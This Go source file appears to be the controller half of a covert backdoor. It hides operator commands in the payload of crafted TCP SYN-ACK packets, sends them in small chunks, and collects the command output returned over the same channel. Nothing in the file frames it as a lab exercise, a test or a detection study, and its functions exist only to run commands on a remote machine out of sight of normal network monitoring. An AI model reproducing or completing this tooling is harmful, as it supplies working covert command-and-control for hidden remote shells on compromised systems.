package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"time"

	"github.com/sirupsen/logrus"
)

const (
	cmdServerLen    = 1
	cmdServerStream = 2
)

func serverSendCommand(conn *Connection, cmd string) {
	cmdb := []byte(cmd)
	lenb := make([]byte, 2)
	binary.LittleEndian.PutUint16(lenb, uint16(len(cmdb)))

	_, _, src, seq := conn.Read()
	conn.SendSYNACK(src, seq, cmdServerLen, lenb)

	for len(cmdb) > 0 {
		_, _, src, seq := conn.Read()

		n := 3
		if n > len(cmdb) {
			n = len(cmdb)
		}
		time.Sleep(sendDelay)
		conn.SendSYNACK(src, seq, cmdServerStream, cmdb[:n])
		cmdb = cmdb[n:]
	}
}

func serverGetOutput(conn *Connection) string {
	_, buf, _, _ := conn.Read()
	output_len := binary.LittleEndian.Uint16(buf)
	output := make([]byte, 0)

	for len(output) < int(output_len) {
		_, buf, _, _ = conn.Read()
		output = append(output, buf...)
	}

	return string(output)
}

func serverMain(listenIP string, listenPort int, cmd string, key []byte) {
	c := NewServerConnection(&net.TCPAddr{IP: ParseIP(listenIP), Port: listenPort}, key)
	defer c.Close()

	serverSendCommand(c, cmd)
	logrus.Debugf("sent command: [%s]", cmd)

	output := serverGetOutput(c)
	fmt.Println(output)
}
